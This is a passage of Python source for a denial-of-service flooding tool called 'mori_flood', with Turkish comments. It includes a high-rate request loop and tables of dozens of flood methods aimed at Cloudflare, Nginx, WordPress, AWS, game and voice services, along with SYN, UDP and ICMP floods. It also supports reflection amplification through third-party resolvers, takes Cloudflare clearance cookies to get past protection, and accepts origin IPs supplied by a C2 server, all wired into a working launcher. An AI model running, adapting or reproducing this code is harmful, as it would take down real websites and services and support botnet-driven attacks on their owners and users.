    drain_every = batch_n * 150      # her ~150 batch'te bir drain

    # sendmsg desteği kontrolü (POSIX only, Windows'ta yok)
    _has_sendmsg = hasattr(socket.socket, 'sendmsg')

    while not _stop.is_set():
        with suppress(Exception):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET,  socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET,  socket.SO_SNDBUF,    524288)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY,  1)
            with suppress(Exception):
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_QUICKACK, 1)
            s.settimeout(4)
            s.connect((t.ip, t.port))

            if _ctx:
                s = _ctx.wrap_socket(s, server_hostname=t.host)

            s.settimeout(5)   # sendall timeout: 5s stall = bağlantı öldü

            sent   = 0
            t0     = time.time()
            drain_ctr = 0

            while not _stop.is_set():
                if _has_sendmsg and not t.tls:
                    # scatter-gather: Python allocation yok, doğrudan kernel'e
                    try:    s.sendmsg([req] * batch_n)
                    except: break
                else:
                    try:    s.sendall(batch)
                    except: break

                sent      += batch_n
                drain_ctr += batch_n

                if drain_ctr >= drain_every:
                    drain_ctr = 0
                    s.setblocking(False)
                    try: s.recv(65536)
                    except: pass
                    s.setblocking(True)
                    s.settimeout(5)

                    el = time.time() - t0
                    if el > 0:
                        cur = sent / el
                        with _lock:
                            if cur > _RPS_PEAK[0]:
                                _RPS_PEAK[0] = cur
                                print(f"\033[95m[RPS_GOD] Peak: {cur:,.0f} req/s\033[0m", flush=True)

            with _lock: SENT[0] += sent
            close(s)


# ── tablo ──────────────────────────────────────────────────────────────────────
L7 = {
    'GET':w_GET, 'POST':w_POST, 'HEAD':w_HEAD, 'PPS':w_PPS, 'NULL':w_NULL,
    'OVH':w_OVH, 'STRESS':w_STRESS, 'COOKIES':w_COOKIES, 'APACHE':w_APACHE,
    'XMLRPC':w_XMLRPC, 'DYN':w_DYN, 'GSB':w_GSB, 'RHEX':w_RHEX,
    'STOMP':w_STOMP, 'BOT':w_BOT, 'SLOW':w_SLOW, 'AVB':w_AVB,
    'CFB':w_CFB, 'BYPASS':w_BYPASS, 'EVEN':w_EVEN, 'DOWNLOADER':w_DOWNLOADER,
    'STATICHTTP':w_STATICHTTP, 'UAM_BYPASS':w_UAM_BYPASS,
    'CF_BYPASS':w_CF_BYPASS, 'RAPID_RESET':w_RAPID_RESET,
    'TLS_SPOOF':w_TLS_SPOOF,  'KILLER':w_KILLER,
    'WEBSOCKET_KILLER':w_WEBSOCKET_KILLER,
    'NGINX_KILLER':w_NGINX_KILLER,
    'WORDPRESS_KILLER':w_WORDPRESS_KILLER,
    'CF_UAM_BOT_BYPASS':w_CF_UAM_BOT_BYPASS,
    'OPENRESTY_KILLER':w_OPENRESTY_KILLER,
    'LITESPEED_KILLER':w_LITESPEED_KILLER,
    'NODEJS_KILLER':w_NODEJS_KILLER,
    'BRAWLSTARS_KILLER':w_BRAWLSTARS_KILLER,
    'KICK_KILLER':w_KICK_KILLER,
    'TELEGRAM_VOICE_KILLER':w_TELEGRAM_VOICE_KILLER,
    'AWS_KILLER':w_AWS_KILLER,
    'CLOUDFRONT_KILLER':w_CLOUDFRONT_KILLER,
    'RPS_GOD_LEVEL':w_RPS_GOD_LEVEL,
}
L4 = {
    'UDP':w_UDP, 'TCP':w_TCP, 'SYN':w_SYN, 'ICMP':w_ICMP,
    'CPS':w_CPS, 'CONNECTION':w_CONNECTION,
    'VSE':w_VSE, 'TS3':w_TS3, 'MCPE':w_MCPE, 'FIVEM':w_FIVEM,
    'DISCORD':w_DISCORD, 'MEGA_UDP':w_MEGA_UDP,
    'SSHLOG_FLOOD':w_SSHLOG_FLOOD,
    'FTP_KILLER':w_FTP_KILLER,
}

# ── başlatıcı ──────────────────────────────────────────────────────────────────
def launch(fn, args, n):
    active=[]
    while not _stop.is_set():
        active=[t for t in active if t.is_alive()]
        while len(active)<n and not _stop.is_set():
            t=Thread(target=fn, args=args, daemon=True); t.start(); active.append(t)
        time.sleep(0.05)

# ── ana program ────────────────────────────────────────────────────────────────
def usage():
    print(__doc__); sys.exit(0)

def main():
    if len(sys.argv)<5 or sys.argv[1] in ('-h','--help','help'):
        usage()

    target_raw = sys.argv[1]
    method     = sys.argv[2].upper()
    duration   = int(float(sys.argv[3]))
    threads    = int(sys.argv[4])
    # '_' veya çok küçük değer = varsayılanı kullan
    def arg(idx, default, cast=int, minval=None):
        if len(sys.argv) <= idx: return default
        v = sys.argv[idx].strip()
        if v in ('_', '-', '', '0'): return default
        try:
            r = cast(v)
            if minval is not None and r < minval: return default
            return r
        except: return default
    refs_raw = sys.argv[5].strip() if len(sys.argv)>5 else '_'
    refs     = [r.strip() for r in refs_raw.split(',') if r.strip() and r.strip()!='_']
    max_cpu  = arg(6, 80,  minval=10)   # < 10 ise 80 kullan
    max_ram  = arg(7, 75,  minval=10)   # < 10 ise 75 kullan
    rpc      = arg(8, 10,  minval=1)

    # POST: argv[9] = base64-encoded body, argv[10] = path override
    if method == 'POST':
        import base64 as _b64post
        global _POST_BODY, _POST_PATH
        if len(sys.argv) > 9 and sys.argv[9] not in ('_', '-', ''):
            try:
                raw = sys.argv[9].replace('-', '+').replace('_', '/')
                pad = (4 - len(raw) % 4) % 4
                _POST_BODY = _b64post.b64decode(raw + '=' * pad).decode('utf-8', errors='ignore')
                print(f"[POST] Body: {len(_POST_BODY)}B — {_POST_BODY[:80]}{'...' if len(_POST_BODY)>80 else ''}", flush=True)
            except Exception as e:
                print(f"[WARN] POST body parse hatası: {e}", flush=True)
        if len(sys.argv) > 10 and sys.argv[10] not in ('_', '-', ''):
            _POST_PATH = sys.argv[10]
            print(f"[POST] Path override: {_POST_PATH}", flush=True)

    # UAM_BYPASS: argv[9] = base64-encoded cookie string (JSON or plain text)
    if method == 'UAM_BYPASS' and len(sys.argv) > 9:
        global _UAM_COOKIE_STR
        import base64, json as _json
        try:
            raw = sys.argv[9].replace('-', '+').replace('_', '/')
            pad = (4 - len(raw) % 4) % 4
            decoded = base64.b64decode(raw + '=' * pad).decode('utf-8', errors='ignore').strip()
            parts_ck = []
            # Format 1: JSON array [{name, value}, ...]
            # Format 2: JSON dict  {name: value, ...}
            # Format 3: Plain text "cf_clearance=abc; _ga=xxx"  (semicolon separated)
            # Format 4: Plain text "cf_clearance=abc\n_ga=xxx"  (newline separated)
            if decoded.startswith('[') or decoded.startswith('{'):
                parsed = _json.loads(decoded)
                if isinstance(parsed, list):
                    parts_ck = [f"{c['name']}={c['value']}" for c in parsed if 'name' in c and 'value' in c]
                elif isinstance(parsed, dict):
                    parts_ck = [f"{k}={v}" for k, v in parsed.items()]
            else:
                # Plain text: split on semicolons or newlines, keep name=value pairs
                for part in decoded.replace('\n', ';').split(';'):
                    part = part.strip()
                    if '=' in part:
                        parts_ck.append(part)
            _UAM_COOKIE_STR = '; '.join(parts_ck)
            print(f"[UAM] {len(parts_ck)} cookie yüklendi: {', '.join(p.split('=')[0] for p in parts_ck)}", flush=True)
        except Exception as e:
            print(f"[WARN] Cookie parse hatası: {e}", flush=True)

    # UAM_BYPASS: argv[10] = base64-encoded JSON array of origin IPs (C2 sunucusu tarafından keşfedildi)
    if method == 'UAM_BYPASS' and len(sys.argv) > 10:
        global _UAM_ORIGIN_IPS
        import base64 as _b64, json as _json2
        try:
            raw10 = sys.argv[10].replace('-', '+').replace('_', '/')
            pad10 = (4 - len(raw10) % 4) % 4
            _UAM_ORIGIN_IPS = _json2.loads(_b64.b64decode(raw10 + '=' * pad10).decode())
            print(f"[UAM] C2'den {len(_UAM_ORIGIN_IPS)} origin IP alındı: {', '.join(_UAM_ORIGIN_IPS)}", flush=True)
        except Exception as e:
            print(f"[WARN] Origin IP parse hatası: {e}", flush=True)

    is_l7  = method in L7
    is_l4  = method in L4
    is_amp = method in AMP_PAYLOADS

    if not is_l7 and not is_l4 and not is_amp:
        print(f"\033[91m[HATA] Bilinmeyen metot: {method}\033[0m")
        print("L7 :", ' '.join(sorted(L7)))
        print("L4 :", ' '.join(sorted(L4)))
        print("AMP:", ' '.join(sorted(AMP_PAYLOADS)))
        sys.exit(1)

    has_root = (os.name != 'nt' and os.geteuid() == 0)
    if is_amp and not has_root:
        print(f"\033[91m[HATA] AMP ({method}) root gerektirir → sudo python3 ...\033[0m")
        sys.exit(1)
    if method in ('SYN','ICMP','DISCORD') and not has_root:
        print(f"\033[93m[INFO] {method}: root yok → UDP/TCP fallback ile çalışacak\033[0m")

    # hedef parse
    if is_l7:
        tgt = Target(target_raw)
        host, port = tgt.host, tgt.port
        label = f"{tgt.scheme}://{tgt.auth}{tgt.path}"
    else:
        if '://' in target_raw:
            u=urlparse(target_raw); host,port=u.hostname, u.port or 80
        elif ':' in target_raw:
            host,port=target_raw.rsplit(':',1); port=int(port)
        else:
            host,port=target_raw,80
        tgt=None; label=f"{host}:{port}"

    # başlık
    bar="═"*60
    print(f"\033[96m{bar}")
    print(f"  mori_flood — {method} → {label}")
    print(f"  Threads={threads} | Duration={duration}s | RPC={rpc}")
    print(f"  CPU<{max_cpu}% RAM<{max_ram}%")
    if HAS_IMP: print("  [+] impacket (raw packet support)")
    if HAS_CS:  print("  [+] cloudscraper (CF bypass)")
    if HAS_REQ: print("  [+] requests (session bypass)")
    print("  [+] CF_BYPASS/TLS_SPOOF: stdlib ssl (cipher spoof) + CF V2/V3 challenge solver")
    print(f"{bar}\033[0m", flush=True)

    # watchdog başlat
    Thread(target=guard, args=(max_cpu,max_ram), daemon=True).start()

    # zamanlayıcı
    def stopper():
        time.sleep(duration); _stop.set()
        print(f"\n\033[92m[BİTTİ] {duration}s | {SENT[0]:,} paket | {BYTES[0]/1024/1024:.1f} MB\033[0m", flush=True)
    Thread(target=stopper, daemon=True).start()

    # durum çıktısı
    def status():
        t0=time.time()
        while not _stop.is_set():
            time.sleep(5)
            el=time.time()-t0
            pps=SENT[0]/el if el>0 else 0
            mbps=BYTES[0]/el/1024/1024*8 if el>0 else 0
            print(f"\033[33m[STAT] {SENT[0]:,} paket | {pps:.0f} pps | {mbps:.1f} Mbps | CPU={cpu():.0f}% RAM={ram():.0f}%\033[0m", flush=True)
    Thread(target=status, daemon=True).start()

    # çalıştır
    try:
        if is_l7:
            fn=L7[method]
            launch(fn, (tgt, rpc), threads)
        elif is_amp:
            if not refs:
                print("\033[91m[HATA] AMP için reflector gerekli: python3 mori_flood.py ... 8.8.8.8,8.8.4.4\033[0m")
                sys.exit(1)
            try: tip=socket.gethostbyname(host)
            except: tip=host
            ap,aprt=AMP_PAYLOADS[method]
            launch(w_AMP, (tip,ap,aprt,refs), threads)
        else:
            fn=L4[method]
            launch(fn, (host,port), threads)
    except KeyboardInterrupt:
        _stop.set()

    while not _stop.is_set(): time.sleep(0.1)
    time.sleep(0.3)
    print(f"\033[96m[SON] Gönderilen={SENT[0]:,} | Bytes={BYTES[0]:,}\033[0m", flush=True)

if __name__=='__main__':
    main()
